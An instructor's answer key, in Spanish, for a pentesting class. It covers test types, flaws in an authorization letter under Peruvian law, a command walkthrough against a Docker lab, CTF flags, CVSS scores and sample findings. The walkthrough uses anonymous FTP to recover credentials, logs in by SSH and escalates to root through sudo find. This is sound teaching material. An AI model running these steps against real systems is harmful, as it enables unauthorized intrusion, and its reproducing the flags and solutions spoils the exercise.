# Solución docente · Clase 02 (NO subir: está en .gitignore)

## Lab 1a · Tipos de prueba

| # | Caja | Ubicación | Qué es |
|---|---|---|---|
| 1 | Negra | Externa | Pentest externo |
| 2 | Gris | Interna | Pentest interno (escenario "empleado / equipo comprometido") |
| 3 | Blanca | — (app) | Pentest web de caja blanca, puede incluir revisión de código |
| 4 | — | — | **Análisis de vulnerabilidades** (no hay explotación) |
| 5 | Negra/gris | Ext. + int. | **Red team**: objetivo concreto + evasión del SOC + semanas |
| 6 | Gris (te dan rango y exclusiones) | Interna | Pentest interno de infraestructura |

## Lab 1b · Fallas de la carta (12)

| # | Falla | Corrección |
|---|---|---|
| 1 | Fecha en blanco | Fecha de emisión y de vigencia |
| 2 | Firma un **Jefe de Sistemas**: ¿tiene poder para autorizar? | Firma el representante legal o quien tenga poderes (gerente general), con cargo y DNI |
| 3 | Alcance `/16` cuando la empresa usa un `/24` | IPs/rangos exactos, uno por línea |
| 4 | Incluye el ERP `172.30.0.30`, **que es de un tercero** (Andes Cloud) | Excluirlo o conseguir autorización escrita del proveedor |
| 5 | "Cualquier otro sistema que encuentre" | Lo que aparezca fuera de la lista se reporta, no se prueba |
| 6 | Sin fechas ni horario ("cuando tenga disponibilidad") | Ventana exacta: fecha/hora de inicio y fin, zona horaria |
| 7 | DoS en horario laboral | DoS prohibido o en ventana nocturna acordada con criterios de parada |
| 8 | Ingeniería social a familiares | Solo empleados en alcance, con escenarios aprobados; familiares nunca |
| 9 | Descargar y conservar BD de clientes y contraseñas en equipos del consultor | Prohibido extraer datos personales (Ley 29733); demostrar impacto con conteos/capturas censuradas; credenciales solo en almacenamiento cifrado y destruidas al cierre (art. 12-A Ley 30096) |
| 10 | Entregable verbal | Informe escrito (ejecutivo + técnico) con fecha de entrega y reunión de cierre |
| 11 | Sin contacto de emergencia ni IP de origen del consultor | Teléfonos 24/7 de ambas partes + IP de origen declarada |
| 12 | Firma solo el consultor; sin confidencialidad ni cláusula de responsabilidad equilibrada | Firman ambas partes; NDA; seguro/limitación de responsabilidad acordada |

Mensaje clave: Ley 30096 art. 2 (modificado por DL 1614, 2023) castiga a quien accede **o se excede en lo autorizado**. El art. 12 exime de responsabilidad a quien hace **pruebas autorizadas** para proteger sistemas. La autorización y su alcance son tu único escudo.

## Lab 2/3 · Recorrido completo (solo comandos)

```bash
nmap -sn 172.30.0.0/24 --excludefile 00-preacuerdo/fuera-de-alcance.txt -oA 01-inteligencia/descubrimiento
# .1 = gateway de Docker = la propia VM
nmap -sV -sC -p- --min-rate 2000 -iL 00-preacuerdo/alcance.txt -oA 01-inteligencia/servicios
# .10: 80 nginx 1.24.0 (robots: /dev-old/)   .20: 21 vsftpd 3.0.5 (ftp-anon), 22 OpenSSH 9.6p1

curl -sI http://172.30.0.10/                      # Server: nginx/1.24.0 (Ubuntu)
curl -s http://172.30.0.10/robots.txt             # Disallow: /dev-old/
curl -s http://172.30.0.10/ | grep -n '<!--'      # TODO quitar /dev-old/
curl -s http://172.30.0.10/dev-old/               # listado: notas-despliegue.txt
curl -s http://172.30.0.10/dev-old/notas-despliegue.txt   # FLAG 01

curl -s ftp://172.30.0.20/pub/
curl -s ftp://172.30.0.20/pub/instructivo-soporte.txt      # soporte / Qhapaq2025!  FLAG 02

ssh soporte@172.30.0.20
cat ~/user.txt                                    # FLAG 03
sudo -l                                           # (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit                # GTFOBins
id; cat /root/root.txt                            # FLAG 04
wc -l /home/soporte/backups/clientes-2025.csv     # 202 líneas = 200 registros + comentario + cabecera
```

Banderas:

- `QHAPAQ{01-reconocimiento-web}`
- `QHAPAQ{02-ftp-anonimo-expone-credenciales}`
- `QHAPAQ{03-acceso-inicial-como-soporte}`
- `QHAPAQ{04-escalada-a-root-via-sudo-find}`

## Lab 4.1 · CVSS 4.0 de referencia (calculado con la librería `cvss` de Python)

| # | Hallazgo | Vector | Puntaje |
|---|---|---|---|
| H1 | FTP anónimo expone credenciales | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` | **8.7 Alta** |
| H2 | sudo NOPASSWD sobre `find` | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` | **8.5 Alta** |
| H3 | Listado de directorio con notas internas | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` | **6.9 Media** |
| H4 | Versión del servidor en cabecera | sin impacto directo | **Informativo** |

Discusiones que valen la pena:

- H1: si el alumno marca impacto en el **sistema subsiguiente** (SC/SI/SA:H, porque la credencial abre el SSH), sube a **9.3 Crítica**. Ambas son defendibles si lo justifica.
- Ningún hallazgo suelto es "crítico", pero la **cadena** (web → FTP → SSH → root → 200 clientes) sí lo es: eso va en el resumen ejecutivo.

## Lab 4.2 · H1 de ejemplo

**H1 · El servidor de archivos permite acceso anónimo y expone las credenciales de soporte**

| Campo | Valor |
|---|---|
| Severidad | Alta |
| CVSS 4.0 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` → **8.7** |
| Activos | 172.30.0.20 · 21/tcp · vsftpd 3.0.5 |
| Referencias | CWE-284 (control de acceso inadecuado) · CWE-256/CWE-312 (credenciales en texto claro) |

**Descripción.** El servicio FTP acepta inicio de sesión anónimo. En `/pub` hay un instructivo interno que contiene el usuario y la contraseña de la cuenta `soporte` en texto claro.

**Evidencia.** 1) `nmap -sC` reporta `ftp-anon: Anonymous FTP login allowed`. 2) `curl -s ftp://172.30.0.20/pub/` lista `instructivo-soporte.txt`. 3) El archivo contiene las credenciales. Archivo: `evidencias/ftp-instructivo-soporte.txt`.

**Impacto.** Cualquier persona con acceso a la red (un proveedor, un visitante, un equipo infectado) obtiene una cuenta válida del servidor de archivos, que da acceso a los datos de 200 clientes y, combinada con H2, control total del servidor.

**Recomendación.** Corto plazo: cambiar la contraseña de `soporte` y retirar el instructivo de `/pub`. Deshabilitar `anonymous_enable` o limitarlo a una carpeta sin información interna. Largo plazo: reemplazar FTP por SFTP con usuarios por proveedor, autenticación SSH por llave y gestor de contraseñas para cuentas de soporte. Verificación: `nmap -sC -p21` ya no debe mostrar `ftp-anon`.

## Lab 4.3 · Resumen ejecutivo de ejemplo

Entre las 19:00 y las 21:30 del __/__ probamos, con autorización, los dos servidores de Inversiones Qhapaq. **Una persona sin ninguna cuenta, conectada a la red interna, puede tomar el control total del servidor de archivos y ver los datos personales y montos invertidos de 200 clientes en menos de 30 minutos.** No hace falta ninguna técnica avanzada: basta con un documento interno que quedó publicado para los proveedores y un permiso administrativo mal configurado. Recomendamos esta semana: 1) cambiar la contraseña de soporte y retirar el instructivo publicado; 2) quitar el permiso `sudo` sobre `find`; 3) borrar la carpeta `/dev-old/` del sitio web. Con esas tres acciones se corta la cadena completa.

## Si un alumno tocó 172.30.0.30

`docker logs qhapaq-erp` muestra la IP `172.30.0.1` (la VM) y la hora. Úsalo como caso: en la vida real se detiene la prueba, se avisa al cliente y al tercero, y se documenta.

Para "resetear" el registro: `docker compose restart erp-proveedor` **no** basta (los logs se conservan); usar `docker compose up -d --force-recreate erp-proveedor`.
